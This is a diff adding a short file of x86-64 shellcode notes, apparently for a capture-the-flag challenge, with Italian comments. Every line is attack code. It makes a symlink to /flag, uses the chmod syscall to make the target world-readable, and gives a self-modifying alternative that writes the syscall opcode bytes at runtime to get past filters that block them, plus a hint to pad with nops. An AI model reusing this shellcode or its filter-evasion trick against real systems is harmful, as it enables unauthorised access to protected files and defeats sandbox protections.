@@ -1,0 +1,19 @@
+ln -s /flag f
+
+Push 0x66
+Push rsp
+Pop rdi
+Push 4
+Pop rsi
+Push 0x5a
+Pop rax
+Syscall <--- (*)
+
+(*) Sostituire se serve:
+  Mov byte ptr [rip+syscall], 0x0f
+  Mov byte ptr [rip+syscall+1], 0x05
+  Lea r8, [rip+syscall]
+  Call r8
+  Syscall: .word 0x0000
+  
+Aggiungere nop all'inizio se serve
